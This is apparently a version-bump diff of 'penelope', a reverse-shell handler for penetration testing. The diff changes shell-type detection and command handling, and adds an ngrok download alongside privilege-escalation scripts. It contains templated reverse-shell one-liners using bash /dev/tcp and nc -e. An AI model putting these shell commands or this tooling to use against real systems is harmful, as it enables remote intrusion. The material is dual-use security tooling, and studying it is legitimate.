@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.12.4"
+__version__ = "0.12.5"
 
 import os
 import io
@@ -1679,7 +1679,7 @@ class Listener:
 	def hints(self):
 		presets = [
 			"bash -c 'exec bash >& /dev/tcp/{}/{} 0>&1 &'",
-			"nc -e cmd {} {}"
+			"nc {} {} -e cmd"
 		]
 
 		output = []
@@ -1825,6 +1825,7 @@ class Session:
 
 			logger.debug(f"OS: {self.OS}")
 			logger.debug(f"Type: {self.type}")
+			logger.debug(f"Type: {self.subtype}")
 			logger.debug(f"Interactive: {self.interactive}")
 			logger.debug(f"Echoing: {self.echoing}")
 
@@ -1888,7 +1889,6 @@ class Session:
 					menu.show()
 		else:
 			self.kill()
-
 		return
 
 	def __bool__(self):
@@ -1956,7 +1956,7 @@ class Session:
 
 	@property
 	def need_control_session(self):
-		return self.type == 'PTY' and not self.agent
+		return all([self.OS == 'Unix', self.type == 'PTY', not self.agent])
 
 	@property
 	def control_sessions(self):
@@ -1994,6 +1994,8 @@ class Session:
 				self.bypass_control_session = True
 				self._tty = self.exec(f"readlink -f /proc/{self.shell_pid}/fd/0", value=True) # TODO check binary
 				self.bypass_control_session = False
+				if not self._tty.startswith("/dev/pts/"):
+					self._tty = False
 			except:
 				pass
 		return self._tty
@@ -2049,7 +2051,7 @@ class Session:
 				if self.OS == "Unix":
 					binaries = [
 						"sh", "bash", "python", "python3",
-						"script", "socat", "stty", "echo", "base64", "wget",
+						"script", "socat", "tty", "echo", "base64", "wget",
 						"curl", "tar", "rm", "stty", "nohup", "find"
 					]
 					response = self.exec(f'for i in {" ".join(binaries)}; do which $i 2>/dev/null || echo;done')
@@ -2151,97 +2153,75 @@ class Session:
 			logger.debug("The session killed abnormally")
 
 	def determine(self, path=False):
-		history = ' export HISTFILE=/dev/null;' if options.no_history else ''
-		path = f' export PATH=$PATH:{LINUX_PATH};' if path else ''
-		cmd = f'{path} export HISTCONTROL=ignoreboth;{history} echo $((1*1000+3*100+3*10+7))`tty`'
-		outcome = b'1337'
 
-		response = self.exec(cmd + '\n', expect=(outcome, b"Windows PowerShell", b'SHELL> ', b'PS>', b'> '), raw=True)
+		var_name1, var_name2, var_value1, var_value2 = (rand(4) for _ in range(4))
 
-		if not response:
-			return False
+		def expect(data):
+			data = data.decode()
+			if var_value1 + var_value2 in data:
+				return True
+			elif f"'{var_name1}' is not recognized as an internal or external command" in data:
+				return re.search('batch file.*>', data, re.DOTALL)
+			elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in data:
+				return re.search('or operable.*>', data, re.DOTALL)
 
-		match = re.search (
-			rf"(Microsoft Windows \[Version (.*)\].*){re.escape(cmd)}".encode(),
-			response,
-			re.DOTALL
-		)
+		response = self.exec(f" {var_name1}={var_value1} {var_name2}={var_value2}; echo ${var_name1}${var_name2}\n", raw=True, expect_func=expect)
+		if response:
+			response = response.decode()
 
-		# Windows cmd.exe
-		if match:
-			self.OS =		'Windows'
-			self.type =		'Basic'
-			self.subtype =		'cmd'
-			self.interactive =	 True
-			self.echoing =		 True
-			self.prompt =		match[1].replace(b"'export' is not recognized\
-			 as an internal or external command,\r\noperable program or batch file.\r\n", b"") # TODO
-			self.version =		match[2]
-			return True
+			if var_value1 + var_value2 in response:
+				self.OS = 'Unix'
+				self.interactive = not response == var_value1 + var_value2 + "\n"
+				self.echoing = f"echo ${var_name1}${var_name2}" in response
+				self.get_shell_pid()
+				if self.tty:
+					self.type = 'PTY'
+					self.pty_ready = True
+					print(self.tty)
 
-		# Windows Powershell
-		if re.match(
-			rf"{outcome.decode()}.*\r\nPS [A-Za-z]:\\".encode(),
-			response,
-			re.DOTALL
-		) or response in (b'SHELL> ', b'PS>', b'> ') or response.startswith(b"Windows PowerShell"):
-			self.OS =		'Windows'
-			self.type =		'Basic'
-			self.subtype =		'psh'
-			self.interactive =	 True
-			self.echoing =		 False
-			self.prompt =		response.splitlines()[-1]
-			return True
+			elif f"'{var_name1}' is not recognized as an internal or external command" in response:
+				self.OS = 'Windows'
+				self.type = 'Basic'
+				self.subtype = 'cmd'
+				self.interactive = True
+				self.echoing = True
+				self.prompt = response.splitlines()[-1].encode()
+				self.version = re.search(rf"Microsoft Windows \[Version (.*)\]", response, re.DOTALL)[1]
 
-		# Unix without PATH
-		if outcome in response and not (b'not a tty' in response or b'/dev/pts/' in response):
-			logger.debug("NO PATH...")
-			return self.determine(path=True) if not path else False
+			elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in response:
+				self.OS = 'Windows'
+				self.type = 'Basic'
+				self.subtype = 'psh'
+				self.interactive = True
+				self.echoing = False
+				self.prompt = response.splitlines()[-1].encode()
+		else:
+			def expect(data):
+				data = data.decode()
+				if var_value1 + var_value2 in data:
+					return True
 
-		# Unix sh / bash
-		if response.startswith(outcome):
-			self.OS =		'Unix'
-			self.type =		'Basic'
-			self.interactive =	 False
-			self.echoing =		 False
-			self.prompt =		b''
-			return True
+			response = self.exec(f"${var_name1}='{var_value1}'; ${var_name2}='{var_value2}'; echo ${var_name1}${var_name2}\r\n", raw=True, expect_func=expect)
+			if not response:
+				return False
+			response = response.decode()
 
-		match = re.match(
-			rf"(.*){outcome.decode()}".encode(),
-			response,
-			re.DOTALL
-		)
-
-		# Unix sh -i / bash -i
-		if match:
-			self.OS =		'Unix'
-			self.interactive =	 True
-
-			match2 = re.match(
-				rf"(.*){re.escape(cmd)}".encode(),
-				match[1],
-				re.DOTALL
-			)
-
-			if match2:
-				self.echoing =	 True
-				self.prompt =	match2[1]
-			else:
-				self.echoing =	 False
-				self.prompt =	match[1]
-
-			if b'not a tty' in response:
-				self.type =	'Basic'
-
-			elif b'/dev/pts/' in response:
-				self.type =	'PTY'
-				self.pty_ready = True
-				self._tty = re.search(rb'/dev/pts/\d*', response)[0].decode()
-
-			return True
-
-		return None
+			if var_value1 + var_value2 in response:
+				self.OS = 'Windows'
+				self.type = 'Basic'
+				self.subtype = 'psh'
+				self.interactive = True
+				self.echoing = False
+				self.prompt = response.splitlines()[-1].encode()
+				if var_name1 in response and not f"echo ${var_name1}${var_name2}" in response:
+					self.type = 'PTY'
+					columns, lines = shutil.get_terminal_size()
+					cmd = f"$width={columns}; $height={lines}; $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height); $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)"
+					self.exec(cmd)
+					self.prompt = response.splitlines()[-2].encode()
+				else:
+					self.prompt = re.sub(var_value1.encode() + var_value2.encode(), b"", self.prompt)
+		return True
 
 	def run_in_background(self, func):
 		def wrapper(*args, **kwargs):
@@ -2257,7 +2237,7 @@ class Session:
 		raw=False, 		# Delimiters
 		value=False,		# Will use the output elsewhere?
 		timeout=False,		# Timeout
-		expect=None,		# Items to wait for in the response
+		expect_func=None,	# Function that determines what to wait for in the response
 		preserve_dir=False,	# Current dir preservation when using control session
 		force_cmd=False,	# Execute cmd command from powershell
 		separate=False,		# If true, send cmd via this method but receive with TLV method (agent)
@@ -2448,7 +2428,7 @@ class Session:
 								f"echo $env:{token[0]}$env:{token[2]};{cmd.decode()};"
 								f"echo $env:{token[2]}$env:{token[0]}\r\n".encode()
 							)
-						if len(cmd) > MAX_CMD_PROMPT_LEN: # TODO check the maxlength on powershell
+						if self.subtype == 'cmd' and len(cmd) > MAX_CMD_PROMPT_LEN: # TODO check the maxlength on powershell
 							logger.error("Max cmd prompt length: {MAX_CMD_PROMPT_LEN} characters")
 							return False
 
@@ -2527,12 +2507,10 @@ class Session:
 							break
 						logger.debug(paint('We didn\'t get all data; continue receiving').yellow)
 
-					elif expect:
-						for item in expect:
-							if item in buffer.getvalue():
-								logger.debug(paint(f"The expected string {item} found in data").yellow)
-								self.subchannel.result = buffer.getvalue()
-								break
+					elif expect_func:
+						if expect_func(buffer.getvalue()):
+							logger.debug(paint(f"The expected strings found in data").yellow)
+							self.subchannel.result = buffer.getvalue()
 						else:
 							logger.debug(paint('No expected strings found in data. Receive again...').yellow)
 
@@ -2683,11 +2661,10 @@ class Session:
 					logger.error("Failed spawning new session")
 					return False
 
-				#if self.type == "Basic":
-					#self.detach()
-					#new_session.upgrade()
-					#if caller() == 'attach':
-				new_session.attach()
+				if self.type == 'PTY':
+					self.attach()
+				else:
+					new_session.attach()
 				return True
 
 			if self.pty_ready:
@@ -2703,8 +2680,11 @@ class Session:
 				self.exec(f"exec nohup {self.shell}", raw=True)
 				self.echoing = False
 
-			expect = (b"\x01",) if self.can_deploy_agent else None
-			response = self.exec(f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}', separate=self.can_deploy_agent, expect=expect, raw=True)
+			def expect(data):
+				if not self.can_deploy_agent or b"\x01" in data:
+					return True
+
+			response = self.exec(f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}', separate=self.can_deploy_agent, expect_func=expect, raw=True)
 			if not isinstance(response, bytes):
 				logger.error("The shell became unresponsive. I am killing it, sorry... Next time I will not try to deploy agent")
 				Path(self.directory / ".noagent").touch()
@@ -2722,20 +2702,20 @@ class Session:
 			self.get_shell_pid()
 
 		elif self.OS == "Windows":
-			self.readline = True
-			logger.info("Added readline support...")
+			if self.type != 'PTY':
+				self.readline = True
+				logger.info("Added readline support...")
 
 		return True
 
 	def update_pty_size(self):
+		columns, lines = shutil.get_terminal_size()
 		if self.OS == 'Unix':
 			if self.agent:
-				columns, lines = shutil.get_terminal_size()
 				self.send(Messenger.message(Messenger.RESIZE, struct.pack("HH", lines, columns)))
 			else: # TODO
-				columns, lines = shutil.get_terminal_size()
 				threading.Thread(target=self.exec, args=(f"stty rows {lines} columns {columns} -F {self.tty}",), name="RESIZE").start() #TEMP
-		elif self.OS == 'Windows':
+		elif self.OS == 'Windows': # TODO
 			pass
 
 	def readline_loop(self):
@@ -2747,7 +2727,8 @@ class Session:
 		while core.attached_session == self:
 			try:
 				cmd = input("\033[s\033[u") # TODO
-				assert len(cmd) <= MAX_CMD_PROMPT_LEN
+				if self.subtype == 'cmd':
+					assert len(cmd) <= MAX_CMD_PROMPT_LEN
 				readline.set_history_length(options.histlength)
 				try:
 					readline.write_history_file(self.histfile)
@@ -3678,7 +3659,7 @@ class ngrok(Module):
 	description = 'Setup ngrok'
 	def run(self):
 		if self.session.OS == 'Unix':
-			self.session.upload("https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz", remote_path=self.session.tmp)
+			self.session.upload(BINARIES['ngrok_linux'], remote_path=self.session.tmp)
 			self.session.exec(f"tar xf {self.session.tmp}/ngrok-v3-stable-linux-amd64.tgz -C ~/.local/bin")
 			token = input("Authtoken: ")
 			self.session.exec(f"ngrok config add-authtoken {token}")
@@ -4259,7 +4240,8 @@ BINARIES = {
 	'linpeas': "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
 	'winpeas': "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat",
 	'lse': "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
-	'powerup': "https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1"
+	'powerup': "https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1",
+	'ngrok_linux': "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz"
 }
 
 # INITIALIZATION
@@ -4297,7 +4279,7 @@ class Options:
 		self.latency = .01
 		self.histlength = 2000
 		self.long_timeout = 60
-		self.short_timeout = 5
+		self.short_timeout = 4
 		self.max_open_files = 5
 		self.verify_ssl_cert = True
 		self.proxy = ''
